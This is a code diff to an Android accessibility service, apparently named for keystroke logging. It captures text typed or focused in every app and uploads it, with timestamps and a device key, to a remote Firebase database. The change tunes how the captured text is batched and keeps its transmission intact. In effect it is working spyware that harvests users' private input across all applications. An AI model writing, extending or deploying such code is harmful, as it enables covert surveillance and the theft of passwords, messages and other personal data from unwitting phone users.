@@ -26,7 +26,7 @@ class StrokeService : AccessibilityService() {
                 AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                 AccessibilityEvent.TYPE_VIEW_FOCUSED
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK
-        info.notificationTimeout = 400
+        info.notificationTimeout = 500
         info.packageNames = null
         serviceInfo = info
 
@@ -78,20 +78,17 @@ class StrokeService : AccessibilityService() {
     private var lastEventText = ""
     private var lastEventTimeStamp = 0L
     private var lastCurrentTime = 0L
-    private fun sendEvent(event: Int, text: String?, desc: CharSequence?) {
+    private fun sendEvent(event:Int, text:String?, desc:CharSequence?){
         val currentTime = System.currentTimeMillis()
         if (text?.length ?: 0 > 3 && lastEventText.length > 3)
             if (text == null) lastEventTimeStamp = currentTime
-        if (text != null) {
-            if (!text.contains(lastEventText) && !lastEventText.contains(text))
+        if (text?.contains(lastEventText) == false && !lastEventText.contains(text)) lastEventTimeStamp = currentTime
+        if (currentTime - lastCurrentTime > 1000 * 7) lastEventTimeStamp = currentTime
+        if (text?.length ?: 0 > 3 && lastEventText.length > 3)
+            if (text?.substring(3) == lastEventText.substring(3))
                 lastEventTimeStamp = currentTime
-            if (currentTime - lastCurrentTime > 1000 * 7) lastEventTimeStamp = currentTime
-            if (text.length > 3 && lastEventText.length > 3)
-                if (text.substring(3) == lastEventText.substring(3))
-                    lastEventTimeStamp = currentTime
-            lastCurrentTime = currentTime
-            lastEventText = text
-        }
+        lastCurrentTime = currentTime
+        lastEventText = text ?: ""
         rtdb.child("actions_v2").child(deviceKey).child("$lastEventTimeStamp").setValue(
             mapOf(
                 "text" to text,
